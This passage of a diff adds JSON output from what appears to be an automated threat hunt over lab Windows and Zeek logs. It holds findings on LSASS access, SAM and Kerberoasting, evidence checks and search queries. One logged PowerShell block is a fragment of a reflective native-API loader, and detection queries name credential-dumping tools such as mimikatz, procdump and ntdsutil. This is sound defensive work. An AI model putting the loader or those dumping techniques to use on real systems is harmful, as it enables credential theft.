+          "id": "AaFFkNQ25mySA1WdEtgZ",
+          "field": "win.TargetFilename",
+          "claimed": "C:\\Users\\pbeesly\\AppData\\Local\\Temp\\RES2758.tmp",
+          "query_id": "q-3c765ade11",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-3c765ade11"
+          ],
+          "actual": "C:\\Users\\pbeesly\\AppData\\Local\\Temp\\RES2758.tmp",
+          "timestamp": "2020-05-02T02:58:45.589Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.16-000001",
+          "id": "AaFFkdQ25mySA1bzyNfQ",
+          "field": "powershell.script_block_text",
+          "claimed": "function jzI {\r\n\tParam ($yKR, $cq)\t\t\r\n\t$vvA = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')",
+          "query_id": "q-b2c1ad2d88",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-943ad46667",
+            "q-b2c1ad2d88"
+          ],
+          "actual": "function jzI {\r\n\tParam ($yKR, $cq)\t\t\r\n\t$vvA = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')\r\n\t\r\n\treturn $vvA.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($vvA.GetMethod('GetModuleHandle')).Invoke($null, @($yKR)))), $cq))\r\n}\r\n\r\nfunction yT {\r\n\tParam (\r\n\t\t[Parameter(Position = 0...(truncated)",
+          "timestamp": "2020-05-01T23:21:29.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.powershell"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 10
+    },
+    {
+      "technique": "T1003.001",
+      "title": "wsmprovhost.exe full-access handle to LSASS on nashua is Get-Process -IncludeUserName enumeration (benign)",
+      "assessment": "benign",
+      "confidence": "medium",
+      "summary": "On 2020-05-02 03:09:29 UTC on nashua.dmevals.local, C:\\windows\\system32\\wsmprovhost.exe (PID 7720, pbeesly PS-remoting session) accessed C:\\windows\\system32\\lsass.exe with GrantedAccess 0x1f3fff. The same 0x1f3fff mask was requested against a long list of unrelated processes (ApplicationFrameHost.exe, browser_broker.exe, conhost.exe, ctfmon.exe, DllHost.exe, dwm.exe, Explorer.EXE, fontdrvhost.exe, LogonUI.exe), and the PS remoting script block recorded at 03:09:28 on nashua is 'Get-Process -IncludeUserName | Select-Object UserName,SessionId | ...' - the standard signature of Get-Process -IncludeUserName enumerating process owners, not targeted LSASS reading. No dump write or remote thread into lsass exists for this host (Sysmon EID 8 query for nashua returned nothing).",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1RrM7IJ",
+          "field": "win.SourceImage",
+          "value": "C:\\windows\\system32\\wsmprovhost.exe",
+          "query_id": "q-6f00616213"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1RrM7IJ",
+          "field": "win.GrantedAccess",
+          "value": "0x1f3fff",
+          "query_id": "q-6f00616213"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1RsM6Q6",
+          "field": "win.TargetImage",
+          "value": "C:\\windows\\system32\\ApplicationFrameHost.exe",
+          "query_id": "q-4917a7f783"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.16-000001",
+          "id": "AaFFkdQ25mySA1bsxh3J",
+          "field": "powershell.script_block_text",
+          "value": "Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like \"*\\$env:USERNAME\" } | Sort-Object SessionId -Unique ",
+          "query_id": "q-f9bdbc4c13"
+        }
+      ],
+      "finding_id": "F02",
+      "verification": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1RrM7IJ",
+          "field": "win.SourceImage",
+          "claimed": "C:\\windows\\system32\\wsmprovhost.exe",
+          "query_id": "q-6f00616213",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c55d9268d6",
+            "q-8d60eda11f",
+            "q-6f00616213",
+            "q-4917a7f783"
+          ],
+          "actual": "C:\\windows\\system32\\wsmprovhost.exe",
+          "timestamp": "2020-05-02T03:09:29.430Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1RrM7IJ",
+          "field": "win.GrantedAccess",
+          "claimed": "0x1f3fff",
+          "query_id": "q-6f00616213",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-c55d9268d6",
+            "q-8d60eda11f",
+            "q-6f00616213",
+            "q-4917a7f783"
+          ],
+          "actual": "0x1f3fff",
+          "timestamp": "2020-05-02T03:09:29.430Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1RsM6Q6",
+          "field": "win.TargetImage",
+          "claimed": "C:\\windows\\system32\\ApplicationFrameHost.exe",
+          "query_id": "q-4917a7f783",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4917a7f783"
+          ],
+          "actual": "C:\\windows\\system32\\ApplicationFrameHost.exe",
+          "timestamp": "2020-05-02T03:09:29.384Z",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.powershell-default-2026.10.16-000001",
+          "id": "AaFFkdQ25mySA1bsxh3J",
+          "field": "powershell.script_block_text",
+          "claimed": "Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like \"*\\$env:USERNAME\" } | Sort-Object SessionId -Unique ",
+          "query_id": "q-f9bdbc4c13",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-f9bdbc4c13"
+          ],
+          "actual": " Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like \"*\\$env:USERNAME\" } | Sort-Object SessionId -Unique ",
+          "timestamp": "2020-05-01T23:09:28.000-04:00",
+          "host": "nashua.dmevals.local",
+          "dataset": "windows.powershell"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 4
+    },
+    {
+      "technique": "T1003.002",
+      "title": "Only lsass.exe itself wrote to the SAM hive; no SAM dump or hive copy observed",
+      "assessment": "benign",
+      "confidence": "medium",
+      "summary": "Registry-write telemetry matching *SAM* on 2020-05-02 contains only two events, both on scranton.dmevals.local: lsass.exe setting HKLM\\SAM\\SAM\\Domains\\Account\\F at 03:19:10 (immediately after the 03:18:30 restart initiated by pbeesly) and LogonUI.exe setting the LogonUI\\SessionData\\2\\LoggedOnSAMUser value at 03:20:46 - i.e. legitimate post-logon SAM bookkeeping by the SAM owner process. No hive extraction tooling was observed: Security 4688 has no reg.exe/reg save, esentutl, ntdsutil or vssadmin executions, and no file-create event writes the SAM/SECURITY/SYSTEM hive files. SAM-hash theft is therefore not demonstrated in this window (LSASS itself was attacked instead - see the T1003.001 finding).",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1NY3HhA",
+          "field": "process.executable",
+          "value": "C:\\windows\\system32\\lsass.exe",
+          "query_id": "q-6732500511"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1NY3HhA",
+          "field": "message",
+          "value": "TargetObject: HKLM\\SAM\\SAM\\Domains\\Account\\F",
+          "query_id": "q-6732500511"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.16-000001",
+          "id": "AaFFkdQ25mySA1aOnx2d",
+          "field": "message",
+          "value": "The process C:\\Windows\\System32\\RuntimeBroker.exe (SCRANTON) has initiated the restart of computer SCRANTON on behalf of user DMEVALS\\pbeesly for the following reason: Other (Unplanned)",
+          "query_id": "q-e6cfba11bd"
+        }
+      ],
+      "finding_id": "F03",
+      "verification": [
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1NY3HhA",
+          "field": "process.executable",
+          "claimed": "C:\\windows\\system32\\lsass.exe",
+          "query_id": "q-6732500511",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-6732500511"
+          ],
+          "actual": "C:\\windows\\system32\\lsass.exe",
+          "timestamp": "2020-05-02T03:19:10.368Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.sysmon-default-2026.10.16-000001",
+          "id": "AaFFkNQ25mySA1NY3HhA",
+          "field": "message",
+          "claimed": "TargetObject: HKLM\\SAM\\SAM\\Domains\\Account\\F",
+          "query_id": "q-6732500511",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-6732500511"
+          ],
+          "actual": "Registry value set:\r\nRuleName: -\r\nEventType: SetValue\r\nUtcTime: 2020-05-02 03:19:10.368\r\nProcessGuid: {47ab858c-e6ad-5eac-0c00-000000000500}\r\nProcessId: 748\r\nImage: C:\\windows\\system32\\lsass.exe\r\nTargetObject: HKLM\\SAM\\SAM\\Domains\\Account\\F\r\nDetails: Binary Data",
+          "timestamp": "2020-05-02T03:19:10.368Z",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.sysmon"
+        },
+        {
+          "index": ".ds-logs-windows.other-default-2026.10.16-000001",
+          "id": "AaFFkdQ25mySA1aOnx2d",
+          "field": "message",
+          "claimed": "The process C:\\Windows\\System32\\RuntimeBroker.exe (SCRANTON) has initiated the restart of computer SCRANTON on behalf of user DMEVALS\\pbeesly for the following reason: Other (Unplanned)",
+          "query_id": "q-e6cfba11bd",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-e6cfba11bd"
+          ],
+          "actual": "The process C:\\Windows\\System32\\RuntimeBroker.exe (SCRANTON) has initiated the restart of computer SCRANTON on behalf of user DMEVALS\\pbeesly for the following reason: Other (Unplanned)\r\n Reason Code: 0x0\r\n Shutdown Type: restart\r\n Comment: ",
+          "timestamp": "2020-05-01T23:18:30.000-04:00",
+          "host": "scranton.dmevals.local",
+          "dataset": "windows.other"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 3
+    },
+    {
+      "technique": "T1558.003",
+      "title": "Kerberos ticketing is AES256-only service/TGT traffic - no RC4 Kerberoasting pattern",
+      "assessment": "benign",
+      "confidence": "medium",
+      "summary": "In windows.security the 28 Kerberos service-ticket requests (EID 4769) are all TicketEncryptionType 0x12 (AES256) for user pbeesly@DMEVALS.LOCAL against machine accounts (ServiceName NEWYORK$, NASHUA$, krbtgt) with Status 0x0, and the 14 TGT requests (EID 4768) are likewise 0x12 for pbeesly/krbtgt - no RC4 (0x17/0x18) ticket storm and no anomalous service SPNs, so Kerberoasting is not evidenced. In the separate, non-overlapping zeek capture window (2020-04-30) every Kerberos record carries cipher aes256-cts-hmac-sha1-96 and the only failures are AS-REQ exchanges answered with KDC_ERR_PREAUTH_REQUIRED for pbeesly (normal pre-authentication, which also argues against AS-REP roasting of that account).",
+      "evidence": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+          "id": "AaFFkdQ25mySA1YhYtYv",
+          "field": "win.TicketEncryptionType",
+          "value": "0x12",
+          "query_id": "q-4d88b6f37f"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+          "id": "AaFFkdQ25mySA1YhYtYv",
+          "field": "win.ServiceName",
+          "value": "NEWYORK$",
+          "query_id": "q-4d88b6f37f"
+        },
+        {
+          "index": ".ds-logs-zeek-default-2026.10.16-000001",
+          "id": "AaFFktQ25mySA1aO8Idf",
+          "field": "message",
+          "value": "\"request_type\":\"AS\",\"client\":\"pbeesly/DMEVALS.LOCAL\",\"service\":\"krbtgt/DMEVALS.LOCAL\",\"success\":false,\"error_msg\":\"KDC_ERR_PREAUTH_REQUIRED\"",
+          "query_id": "q-d16a0b10de"
+        }
+      ],
+      "finding_id": "F04",
+      "verification": [
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+          "id": "AaFFkdQ25mySA1YhYtYv",
+          "field": "win.TicketEncryptionType",
+          "claimed": "0x12",
+          "query_id": "q-4d88b6f37f",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4d88b6f37f"
+          ],
+          "actual": "0x12",
+          "timestamp": "2020-05-01T23:04:04.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-windows.security-default-2026.10.16-000001",
+          "id": "AaFFkdQ25mySA1YhYtYv",
+          "field": "win.ServiceName",
+          "claimed": "NEWYORK$",
+          "query_id": "q-4d88b6f37f",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-4d88b6f37f"
+          ],
+          "actual": "NEWYORK$",
+          "timestamp": "2020-05-01T23:04:04.000-04:00",
+          "host": "newyork.dmevals.local",
+          "dataset": "windows.security"
+        },
+        {
+          "index": ".ds-logs-zeek-default-2026.10.16-000001",
+          "id": "AaFFktQ25mySA1aO8Idf",
+          "field": "message",
+          "claimed": "\"request_type\":\"AS\",\"client\":\"pbeesly/DMEVALS.LOCAL\",\"service\":\"krbtgt/DMEVALS.LOCAL\",\"success\":false,\"error_msg\":\"KDC_ERR_PREAUTH_REQUIRED\"",
+          "query_id": "q-d16a0b10de",
+          "ok": true,
+          "problems": [],
+          "returned_by": [
+            "q-d16a0b10de"
+          ],
+          "actual": "{\"@stream\":\"kerberos\",\"@system\":\"simplerockbuild.simplerock.lan\",\"@proc\":\"zeek\",\"ts\":1588206259.11049,\"uid\":\"C6f4oNkbm2Uhvs1Q5\",\"id_orig_h\":\"10.0.1.4\",\"id_orig_p\":60692,\"id_resp_h\":\"10.0.0.4\",\"id_resp_p\":88,\"request_type\":\"AS\",\"client\":\"pbeesly/DMEVALS.LOCAL\",\"service\":\"krbtgt/DMEVALS.LOCAL\",\"success\":false,\"error_msg\":\"KDC_ERR_PREAUTH_REQUIRED\",\"till\":2136422885.0,\"forwardable\":true,\"renewable\":true}",
+          "timestamp": "2020-04-30T00:24:19.110Z",
+          "host": "simplerockbuild.simplerock.lan",
+          "dataset": "zeek"
+        }
+      ],
+      "verified": true,
+      "verified_evidence": 3
+    }
+  ],
+  "findings_counted": [
+    "F01",
+    "F02",
+    "F03",
+    "F04"
+  ],
+  "incidents": [],
+  "context_out_of_scope": [],
+  "evidence_corrections": [],
+  "queries": [
+    {
+      "query_id": "q-c1d5f3128e",
+      "phase": "scope",
+      "tool": "list_data_sources",
+      "args": {},
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-9032cbb4f4",
+      "phase": "scope",
+      "tool": "get_registry",
+      "args": {},
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-ac94c9ed11",
+      "phase": "scope",
+      "tool": "get_fields",
+      "args": {
+        "dataset": "windows.other",
+        "prefix": ""
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-22d7b9c81d",
+      "phase": "scope",
+      "tool": "get_fields",
+      "args": {
+        "dataset": "windows.powershell",
+        "prefix": ""
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-6064715925",
+      "phase": "scope",
+      "tool": "get_fields",
+      "args": {
+        "dataset": "windows.security",
+        "prefix": ""
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-1db807639d",
+      "phase": "scope",
+      "tool": "get_fields",
+      "args": {
+        "dataset": "windows.sysmon",
+        "prefix": ""
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-558f1b7709",
+      "phase": "scope",
+      "tool": "get_fields",
+      "args": {
+        "dataset": "zeek",
+        "prefix": ""
+      },
+      "hits": null,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-0c41343298",
+      "phase": "check C001 (repaired)",
+      "tool": "aggregate",
+      "args": {
+        "dataset": "windows.sysmon",
+        "field": "win.SourceImage",
+        "query": "event.code:10 AND win.TargetImage:*lsass*",
+        "time_from": null,
+        "time_to": null,
+        "size": 20,
+        "sub_field": null
+      },
+      "hits": 326,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-7c6a6e8483",
+      "phase": "check C002 (repaired)",
+      "tool": "aggregate",
+      "args": {
+        "dataset": "windows.sysmon",
+        "field": "win.GrantedAccess",
+        "query": "event.code:10 AND win.TargetImage:*lsass*",
+        "time_from": null,
+        "time_to": null,
+        "size": 20,
+        "sub_field": null
+      },
+      "hits": 326,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-27c2eea47e",
+      "phase": "check C003",
+      "tool": "esql",
+      "args": {
+        "query": "FROM windows.sysmon METADATA _id, _index | WHERE event.code == \"10\" AND TO_LOWER(win.TargetImage) LIKE \"*lsass*\" | KEEP @timestamp, host.name, win.SourceImage, win.TargetImage, win.GrantedAccess, win.CallTrace, _id, _index"
+      },
+      "hits": null,
+      "error": "{\"error\": {\"root_cause\": [{\"type\": \"verification_exception\", \"reason\": \"Unknown index [windows.sysmon]\"}], \"type\": \"verification_exception\", \"reason\": \"Unknown index [windows.sysmon]\"}, \"status\": 400}",
+      "cited_by": []
+    },
+    {
+      "query_id": "q-c55d9268d6",
+      "phase": "check C003 (repaired)",
+      "tool": "esql",
+      "args": {
+        "query": "FROM logs-windows.sysmon-default METADATA _id, _index | WHERE event.code == \"10\" AND TO_LOWER(win.TargetImage) LIKE \"*lsass*\" | KEEP @timestamp, host.name, win.SourceImage, win.TargetImage, win.GrantedAccess, win.CallTrace, _id, _index"
+      },
+      "hits": 326,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-781f2b0f8c",
+      "phase": "check C004",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:1 AND (process.command_line:*comsvcs* OR process.command_line:*MiniDump* OR process.command_line:*procdump* OR process.command_line:*mimikatz* OR process.command_line:*sekurlsa*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "observer.name",
+          "event.dataset",
+          "event.code",
+          "user.name",
+          "process.executable",
+          "process.command_line",
+          "source.ip",
+          "destination.ip",
+          "message"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-5a94cc01ae",
+      "phase": "check C005",
+      "tool": "esql",
+      "args": {
+        "query": "FROM windows.powershell METADATA _id, _index | WHERE event.code == \"4104\" AND (TO_LOWER(powershell.script_block_text) LIKE \"*mimikatz*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*sekurlsa*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*minidump*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*comsvcs*\") | KEEP @timestamp, host.name, user.name, win.ScriptBlockId, _id, _index"
+      },
+      "hits": null,
+      "error": "{\"error\": {\"root_cause\": [{\"type\": \"verification_exception\", \"reason\": \"Unknown index [windows.powershell]\"}], \"type\": \"verification_exception\", \"reason\": \"Unknown index [windows.powershell]\"}, \"status\": 400}",
+      "cited_by": []
+    },
+    {
+      "query_id": "q-0d9c585271",
+      "phase": "check C005 (repaired)",
+      "tool": "esql",
+      "args": {
+        "query": "FROM logs-windows.powershell-default METADATA _id, _index | WHERE event.code == \"4104\" AND (TO_LOWER(powershell.script_block_text) LIKE \"*mimikatz*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*sekurlsa*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*minidump*\" OR TO_LOWER(powershell.script_block_text) LIKE \"*comsvcs*\") | KEEP @timestamp, host.name, user.name, win.ScriptBlockId, _id, _index"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-6732500511",
+      "phase": "check C006",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:13 AND win.TargetObject:*SAM*",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "observer.name",
+          "event.dataset",
+          "event.code",
+          "user.name",
+          "process.executable",
+          "process.command_line",
+          "source.ip",
+          "destination.ip",
+          "message"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 2,
+      "error": null,
+      "cited_by": [
+        "F03"
+      ]
+    },
+    {
+      "query_id": "q-d6416ffeb8",
+      "phase": "check C007",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.security",
+        "query": "event.code:4663 AND win.ObjectName:*SAM*",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "observer.name",
+          "event.dataset",
+          "event.code",
+          "user.name",
+          "process.executable",
+          "process.command_line",
+          "source.ip",
+          "destination.ip",
+          "message"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-78c35491a2",
+      "phase": "check C008",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:1 AND (process.command_line:*reg save* OR process.command_line:*esentutl* OR process.command_line:*\\\\SAM\\\\* OR process.command_line:*SYSTEM*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "observer.name",
+          "event.dataset",
+          "event.code",
+          "user.name",
+          "process.executable",
+          "process.command_line",
+          "source.ip",
+          "destination.ip",
+          "message"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-ae9a5f06b4",
+      "phase": "check C009",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:11 AND (win.TargetFilename:*ntds.dit* OR file.path:*ntds.dit*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "observer.name",
+          "event.dataset",
+          "event.code",
+          "user.name",
+          "process.executable",
+          "process.command_line",
+          "source.ip",
+          "destination.ip",
+          "message"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-00ebd8ebb4",
+      "phase": "check C010",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:1 AND (process.command_line:*ntdsutil* OR process.command_line:*\"ac i ntds\"* OR process.command_line:*vssadmin*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "observer.name",
+          "event.dataset",
+          "event.code",
+          "user.name",
+          "process.executable",
+          "process.command_line",
+          "source.ip",
+          "destination.ip",
+          "message"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-5a8d82fcfc",
+      "phase": "check C011",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.security",
+        "query": "event.code:4688 AND (process.command_line:*ntdsutil* OR process.command_line:*esentutl*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "observer.name",
+          "event.dataset",
+          "event.code",
+          "user.name",
+          "process.executable",
+          "process.command_line",
+          "source.ip",
+          "destination.ip",
+          "message"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-350bf7377b",
+      "phase": "check C012 (repaired)",
+      "tool": "aggregate",
+      "args": {
+        "dataset": "windows.security",
+        "field": "event.code",
+        "query": "event.code:4769",
+        "time_from": null,
+        "time_to": null,
+        "size": 20,
+        "sub_field": null
+      },
+      "hits": 28,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-a10ad7719d",
+      "phase": "check C013 (repaired)",
+      "tool": "aggregate",
+      "args": {
+        "dataset": "zeek",
+        "field": "zeek.cipher",
+        "query": "event.action:kerberos",
+        "time_from": null,
+        "time_to": null,
+        "size": 20,
+        "sub_field": null
+      },
+      "hits": 35,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-d16a0b10de",
+      "phase": "check C014",
+      "tool": "search",
+      "args": {
+        "dataset": "zeek",
+        "query": "event.action:kerberos AND (zeek.error_msg:* OR zeek.success:false)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "observer.name",
+          "event.dataset",
+          "event.code",
+          "user.name",
+          "process.executable",
+          "process.command_line",
+          "source.ip",
+          "destination.ip",
+          "message"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 7,
+      "error": null,
+      "cited_by": [
+        "F04"
+      ]
+    },
+    {
+      "query_id": "q-d944586364",
+      "phase": "check C015",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:13 AND (win.TargetObject:*SECURITY\\\\Policy\\\\Secrets* OR win.TargetObject:*LSA* OR win.TargetObject:*Cache*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "observer.name",
+          "event.dataset",
+          "event.code",
+          "user.name",
+          "process.executable",
+          "process.command_line",
+          "source.ip",
+          "destination.ip",
+          "message"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 6625,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-119d32bea5",
+      "phase": "check C016",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.other",
+        "query": "event.code:1 AND (process.command_line:*lsass* OR process.command_line:*dump* OR process.command_line:*credentials*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "observer.name",
+          "event.dataset",
+          "event.code",
+          "user.name",
+          "process.executable",
+          "process.command_line",
+          "source.ip",
+          "destination.ip",
+          "message"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-8d60eda11f",
+      "phase": "investigate step 1",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:10 AND win.TargetImage:*lsass* AND (win.GrantedAccess:0x1f3fff OR win.GrantedAccess:0x1fffff OR win.GrantedAccess:0x101001 OR win.GrantedAccess:0x1000000 OR win.GrantedAccess:0x3000)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "win.SourceImage",
+          "win.TargetImage",
+          "win.GrantedAccess",
+          "win.CallTrace",
+          "process.executable",
+          "process.command_line",
+          "win.ProcessId",
+          "win.SourceProcessId",
+          "message"
+        ],
+        "size": 20,
+        "sort": "asc"
+      },
+      "hits": 9,
+      "error": null,
+      "cited_by": [
+        "F01"
+      ]
+    },
+    {
+      "query_id": "q-788df0a48b",
+      "phase": "investigate step 1",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.sysmon",
+        "query": "event.code:1 AND (process.command_line:*lsass* OR process.command_line:*procdump* OR process.command_line:*mimikatz* OR process.command_line:*sekurlsa*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "process.executable",
+          "process.command_line",
+          "process.parent.executable",
+          "user.name",
+          "message"
+        ],
+        "size": 30,
+        "sort": "asc"
+      },
+      "hits": 1,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-4d88b6f37f",
+      "phase": "investigate step 1",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.security",
+        "query": "event.code:4769",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "win.TargetUserName",
+          "win.ServiceName",
+          "win.IpAddress",
+          "win.TicketEncryptionType",
+          "win.TicketOptions",
+          "win.Status",
+          "win.TargetDomainName",
+          "user.name"
+        ],
+        "size": 30,
+        "sort": "asc"
+      },
+      "hits": 28,
+      "error": null,
+      "cited_by": [
+        "F04"
+      ]
+    },
+    {
+      "query_id": "q-be60fd7c72",
+      "phase": "investigate step 1",
+      "tool": "esql",
+      "args": {
+        "query": "FROM logs-windows.sysmon-default METADATA _id, _index | WHERE TO_LOWER(process.executable) LIKE \"%wsmprovhost%\" | KEEP @timestamp, host.name, event.code, process.executable, process.command_line, process.parent.executable, user.name, _id, _index"
+      },
+      "hits": 0,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-fef861f62f",
+      "phase": "investigate step 2",
+      "tool": "search",
+      "args": {
+        "dataset": "windows.powershell",
+        "query": "powershell.script_block_text:(*lsass* OR *Mimikatz* OR *sekurlsa* OR *DumpCreds* OR *Credential* OR *Dump* OR *password*)",
+        "time_from": null,
+        "time_to": null,
+        "fields": [
+          "@timestamp",
+          "host.name",
+          "event.code",
+          "powershell.script_block_text",
+          "user.name",
+          "win.ScriptBlockId"
+        ],
+        "size": 30,
+        "sort": "asc"
+      },
+      "hits": 3,
+      "error": null,
+      "cited_by": []
+    },
+    {
+      "query_id": "q-f367f18257",
